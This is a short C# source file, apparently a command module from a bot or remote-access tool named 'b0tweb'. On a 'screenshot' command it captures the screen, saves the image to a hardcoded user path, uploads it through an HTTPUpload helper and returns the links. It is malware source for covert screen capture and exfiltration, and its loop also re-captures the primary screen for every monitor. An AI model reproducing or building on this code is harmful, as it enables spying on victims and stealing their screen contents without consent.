using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace b0tweb.Commands
{
    class ScreenshotCommand : AbstractCommand
    {
        public override string Command => "screenshot";

        protected override string ExecuteCommand(string[] args)
        {
            string[] urls = new string[Screen.AllScreens.Length];

            int i = 0;

            foreach (Screen screen in Screen.AllScreens) 
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                    bmp.Save(@"C:\Users\x0rz3q\screenshot.png");
                }

                string url = HTTPUpload.Upload(@"C:\Users\x0rz3q\screenshot.png");
                urls[i] = url;
                i++;
            }

            return String.Join(", ", urls);
        }
    }
}
